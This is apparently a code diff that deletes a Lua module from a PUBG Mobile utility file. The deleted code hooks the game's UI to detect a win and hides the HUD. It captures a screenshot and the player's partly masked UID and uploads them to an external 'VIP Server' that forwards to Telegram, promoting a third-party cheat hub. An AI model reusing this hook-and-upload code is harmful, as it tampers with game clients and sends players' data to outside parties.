-	local data = file:read("*a") or ""
-	file:close()
-	return data
-end
-
-local function AF_RemoveFile(path)
-	pcall(os.remove, path)
-end
-
-local function AF_GetRankName(rank)
-	if rank < 1700 then return "Bronze"
-	elseif rank < 2200 then return "Silver"
-	elseif rank < 2700 then return "Gold"
-	elseif rank < 3200 then return "Platinum"
-	elseif rank < 3700 then return "Diamond"
-	elseif rank < 4200 then return "Crown"
-	elseif rank < 4700 then return "Ace"
-	elseif rank < 5200 then return "Ace Master"
-	elseif rank < 5600 then return "Ace Dominator"
-	end
-	return "Conqueror"
-end
-
-local FeedbackCaptionTemplate = table.concat({
-	"",
-	"<b>&#9992; MAGOO — WINNER REPORT</b>",
-	"<b>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;</b>",
-	"",
-	"<pre>",
-	"  &#128100; Player  : %s",
-	"  &#128273; UID     : %s",
-	"  &#128336; Time    : %s",
-	"  &#128296; Kills   : %d",
-	"  &#127942; Rank    : %s",
-	"</pre>",
-	"",
-	"<b>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;</b>",
-	"<b>&#9989; STATUS  : ACTIVE &amp; SAFE</b>",
-	"<b>&#128276; OWNER   : @THE_MAGOO</b>",
-	"<b>&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;&#9472;</b>",
-	"",
-}, "\n")
-
-function AutoFeedback.SendFeedback(path, kills, rank, segment)
-	AF_Log("Preparing to send feedback. Screenshot: " .. tostring(path))
-	local ok, err = pcall(function()
-		local httpManager = AF_GetModule("client.slua.logic.http.http_manager")
-		if not httpManager or type(httpManager.Post) ~= "function" then
-			AF_Log("HTTP manager is unavailable.")
-			return
-		end
-		local attempts = 0
-		local function TrySend()
-			local imageData = AF_ReadFile(path)
-			if #imageData > 0 then
-				local uid = "unknown"
-				if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
-					uid = tostring(_G.DataMgr.roleData.uid)
-				elseif _G._KONG_UK then
-					uid = tostring(_G._KONG_UK)
-				end
-				kills = tonumber(kills) or 0
-				rank = tonumber(rank) or 0
-				segment = tonumber(segment) or 0
-				local maskedName = "*****"
-				local maskedUid = "***"
-				if uid ~= "unknown" and #uid > 5 then
-					maskedUid = uid:sub(1, 3) .. "***" .. uid:sub(-2)
-				end
-				local caption = string.format(
-					FeedbackCaptionTemplate,
-					maskedName,
-					maskedUid,
-					os.date("%H:%M:%S %d/%m/%Y"),
-					kills,
-					AF_GetRankName(rank)
-				)
-				local encodedImage = AF_Base64Encode(imageData)
-				encodedImage = encodedImage:gsub("%+", "%%2B")
-				encodedImage = encodedImage:gsub("/", "%%2F")
-				encodedImage = encodedImage:gsub("=", "%%3D")
-				AF_Notify("[SRC_HUB] Uploading Top 1 screenshot to VIP Server...")
-				-- bot_token and chat_id are supplied by the Worker (env secrets).
-				-- Do NOT add them here — this script is public.
-				local body = "base64_image=" .. encodedImage
-					.. "&caption=" .. AF_UrlEncode(caption)
-				httpManager:Post(
-					AutoFeedback.Config.ServerURL,
-					{["Content-Type"] = "application/x-www-form-urlencoded"},
-					body,
-					nil,
-					function(success, _, response, errorMessage)
-						if success and response and tostring(response):find('"status":%s*true') then
-							AF_Notify("[SRC_HUB] Successfully sent! (Kills: " .. tostring(kills) .. ")")
-						else
-							local detail = tostring(response or errorMessage):sub(1, 40)
-							AF_Notify("[SRC_HUB] VIP Server error: " .. detail)
-						end
-						AF_RemoveFile(path)
-					end,
-					60
-				)
-				return
-			end
-			attempts = attempts + 1
-			if attempts < 5 and AF_AddTimerOnce(1.0, TrySend) then
-				return
-			end
-			AF_Notify("[SRC_HUB] Screenshot capture failed!")
-			AF_RemoveFile(path)
-		end
-		TrySend()
-	end)
-	if not ok then
-		AF_Log("SendFeedback Error: " .. tostring(err))
-	end
-end
-
-local AF_HudNames = {
-	"BattleChat_UIBP","Chat_UIBP","ChatMsg_UIBP","TeamAvatar_UIBP","Team_UIBP",
-	"VoiceChat_UIBP","MiniMap_UIBP","Bag_UIBP","PickUp_UIBP","PickUpList_UIBP",
-	"SystemChat_UIBP","InGameChat_UIBP","InGameChatPanel_UIBP","KillFeed_UIBP",
-	"Elimination_UIBP","ChatHUD_UIBP","ChatPanel_UIBP","MainHUD_UIBP","BattleHUD_UIBP"
-}
-
-local function AF_GetRankAndSegment()
-	local rank = 0
-	local segment = 0
-	pcall(function()
-		local battleResult = _G.BP_STRUCT_BattleResultData
-		local rating = battleResult and (battleResult.rating or battleResult.BP_STRUCT_BTRating)
-		if rating then
-			rank = tonumber(rating.rank_rating) or 0
-			segment = tonumber(rating.new_segment) or 0
-		end
-		if rank == 0 then
-			local funcUtil = AF_GetModule("common.func_util")
-			local roleData = _G.DataMgr and _G.DataMgr.roleData
-			if funcUtil and type(funcUtil.GetCurMaxSegementLevel) == "function"
-				and roleData and roleData.allzoneSegment then
-				segment = tonumber(funcUtil.GetCurMaxSegementLevel(roleData.allzoneSegment)) or 0
-			end
-			if roleData and roleData.segment_rating then
-				for _, value in pairs(roleData.segment_rating) do
-					if type(value) == "table" then
-						for _, nestedValue in pairs(value) do
-							if type(nestedValue) == "number" and nestedValue > rank then
-								rank = nestedValue
-							end
-						end
-					elseif type(value) == "number" and value > rank then
-						rank = value
-					end
-				end
-			end
-		end
-	end)
-	return rank, segment
-end
-
-local function AF_CreateHudController()
-	local hidden = {}
-	local function SetHidden(hide)
-		local UIManager = _G.UIManager
-		if not UIManager then return end
-		if hide then
-			for _, name in ipairs(AF_HudNames) do
-				local config
-				if UIManager.UI_Config_InGame and UIManager.UI_Config_InGame[name] then
-					config = UIManager.UI_Config_InGame[name]
-				elseif UIManager.UI_Config and UIManager.UI_Config[name] then
-					config = UIManager.UI_Config[name]
-				end
-				if config then
-					local view = type(UIManager.GetUI) == "function" and UIManager.GetUI(config) or nil
-					if view then
-						pcall(function()
-							if type(view.SetVisibility) == "function" then
-								view:SetVisibility(2)
-							elseif view.UIRoot and type(view.UIRoot.SetVisibility) == "function" then
-								view.UIRoot:SetVisibility(2)
-							elseif type(UIManager.HideUI) == "function" then
-								UIManager.HideUI(config)
-							elseif type(UIManager.CloseUI) == "function" then
-								UIManager.CloseUI(config)
-							end
-						end)
-						table.insert(hidden, {config = config, view = view})
-					end
-				end
-			end
-			return
-		end
-		for _, item in ipairs(hidden) do
-			pcall(function()
-				if item.view and type(item.view.SetVisibility) == "function" then
-					item.view:SetVisibility(0)
-				elseif item.view and item.view.UIRoot and type(item.view.UIRoot.SetVisibility) == "function" then
-					item.view.UIRoot:SetVisibility(0)
-				elseif type(UIManager.ShowUI) == "function" then
-					UIManager.ShowUI(item.config)
-				end
-			end)
-		end
-		hidden = {}
-	end
-	return SetHidden
-end
-
-local function AF_GetScreenshotDirectory()
-	local directories = {}
-	local home = os.getenv("HOME")
-	if home and home ~= "" then
-		table.insert(directories, home .. "/Documents/ShadowTrackerExtra/Saved/")
-	end
-	local packages = {"com.tencent.ig","com.vng.pubgmobile","com.pubg.krmobile","com.rekoo.pubgm","com.pubg.imobile"}
-	for _, packageName in ipairs(packages) do
-		table.insert(directories,
-			"/storage/emulated/0/Android/data/" .. packageName
-			.. "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/")
-	end
-	local selected = directories[1]
-	for _, directory in ipairs(directories) do
-		local testPath = directory .. "t.tmp"
-		local file = io.open(testPath, "w")
-		if file then
-			file:close()
-			os.remove(testPath)
-			selected = directory
-			break
-		end
-	end
-	return selected
-end
-
-local function AF_CaptureAndSend(kills, rank, segment, restoreHud)
-	local restored = false
-	local function RestoreHudOnce()
-		if not restored then
-			restored = true
-			restoreHud(false)
-		end
-	end
-	local ScreenshotMaker = import("ScreenshotMaker")
-	if not ScreenshotMaker then RestoreHudOnce(); return end
-	local directory = AF_GetScreenshotDirectory()
-	if not directory then RestoreHudOnce(); return end
-	local path = directory .. string.format("kongwin_%s.jpg", os.time())
-	local uiUtil = AF_GetModule("client.common.ui_util")
-	local gameInstance = uiUtil and uiUtil.GetGameInstance and uiUtil.GetGameInstance()
-	local enginePreTick = gameInstance and gameInstance.EnginePreTick
-	if not enginePreTick or type(enginePreTick.Add) ~= "function" then
-		RestoreHudOnce(); return
-	end
-	local ticker = AF_GetModule("common.time_ticker")
-	if not ticker or type(ticker.AddTimerOnce) ~= "function" then
-		RestoreHudOnce(); return
-	end
-	enginePreTick:Add(function()
-		local actualPath = ScreenshotMaker.MakePictureByName(path, true)
-		if type(enginePreTick.Clear) == "function" then enginePreTick:Clear() end
-		if actualPath and actualPath ~= "" then path = actualPath end
-		local attempts = 0
-		local function CheckCapture()
-			attempts = attempts + 1
-			local captured = false
-			pcall(function() captured = ScreenshotMaker.HasCaptured(path) end)
-			if captured then
-				RestoreHudOnce()
-				AF_Log("HasCaptured=true. Flushing to disk via ResizePicture...")
-				pcall(ScreenshotMaker.ResizePicture, path, 0.9, path)
-				ticker.AddTimerOnce(2.0, function()
-					if #AF_ReadFile(path) > 0 then
-						AutoFeedback.SendFeedback(path, kills, rank, segment)
-					else
-						AF_Notify("[SRC_HUB] iOS image read error!")
-					end
-				end)
-			elseif attempts < 15 then
-				ticker.AddTimerOnce(1, CheckCapture)
-			else
-				RestoreHudOnce()
-				AF_Notify("[SRC_HUB] Screenshot capture failed!")
-			end
-		end
-		ticker.AddTimerOnce(1, CheckCapture)
-	end)
-end
-
-function AutoFeedback.ProcessWin(kills)
-	kills = tonumber(kills) or 0
-	local rank, segment = AF_GetRankAndSegment()
-	-- ✅ ALL RANKS SUPPORTED - Sirf kills check (kills > 0)
-	if kills <= 0 then
-		AF_Log(string.format("Skipping feedback: Kill %d (Requires Kill > 0)", kills))
-		return
-	end
-	AF_Notify("[SRC_HUB] Congratulations on getting TOP 1! Rank: " .. AF_GetRankName(rank))
-	local setHudHidden = AF_CreateHudController()
-	setHudHidden(true)
-	local ok, err = pcall(AF_CaptureAndSend, kills, rank, segment, setHudHidden)
-	if not ok then
-		setHudHidden(false)
-		AF_Log("ProcessWin Error: " .. tostring(err))
-	end
-end
-
-local function AF_GetWinnerKills()
-	local kills = 0
-	pcall(function()
-		local likeUtil = AF_GetModule("GameLua.Mod.BaseMod.Client.Like.IngameLikeUtilClient")
-		if likeUtil and type(likeUtil.GetMyPlayerState) == "function" then
-			local playerState = likeUtil.GetMyPlayerState()
-			if playerState and playerState.Kills then
-				kills = tonumber(playerState.Kills) or 0
-			end
-		end
-		if kills == 0 then
-			local resultLogic = AF_GetModule(
-				"GameLua.Mod.BaseMod.Client.BattleResult.BattleResultData.BattleResultDataLogic",
-				false
-			)
-			if resultLogic and type(resultLogic.GetBattleResultData) == "function" then
-				local result = resultLogic:GetBattleResultData()
-				if result and result.BP_mykill then
-					kills = tonumber(result.BP_mykill) or 0
-				end
-			end
-		end
-	end)
-	return kills
-end
-
-local function AF_TryInstallHook()
-	pcall(function()
-		local UIManager = _G.UIManager
-		if not UIManager or not UIManager.ShowUI then return end
-		if UIManager.__SRCHUBHooked then
-			UIManager.__SRCHUBHooked = false
-		end
-		AF_Log("Hooking UIManager.ShowUI for in-game Winner UI...")
-		local originalShowUI = UIManager.ShowUI
-		UIManager.ShowUI = function(config, params, ...)
-			local result = originalShowUI(config, params, ...)
-			pcall(function()
-				-- ✅ STRONG WINNER DETECTION - Chicken Dinner Fix
-				if not params then return end
-
-				local isWinner = params.Reason == "win"
-					or params.ShowedWinLogo == true
-					or params.IsWin == true
-					or params.IsWinner == true
-					or params.bWin == true
-					or params.Win == true
-
-				if not isWinner then return end
-
-				local kills = AF_GetWinnerKills()
-				if not AF_AddTimerOnce(2, function() AutoFeedback.ProcessWin(kills) end) then
-					AutoFeedback.ProcessWin(kills)
-				end
-			end)
-			return result
-		end
-		-- UIManager.__SRCHUBHooked = true
-		AF_Log("UIManager Hook installed successfully.")
-	end)
-end
-
-function AutoFeedback.Install()
-	AF_Log("Installing Pro system (Telegram)...")
-	if AutoFeedback.Config.TestMode then
-		pcall(function()
-			AF_AddTimerOnce(5.0, function() AutoFeedback.ProcessWin(1) end)
-		end)
-	end
-	pcall(function()
-		local ticker = AF_GetModule("common.time_ticker")
-		if ticker and type(ticker.AddTimer) == "function" then
-			ticker.AddTimer(3.0, AF_TryInstallHook)
-		else
-			AF_TryInstallHook()
-		end
-	end)
-end
-
-	_G.MAGOO_AutoFeedbackRecovered = AutoFeedback
-	_G.MagooAutoFeedback = AutoFeedback
-end)
-
+return file_util
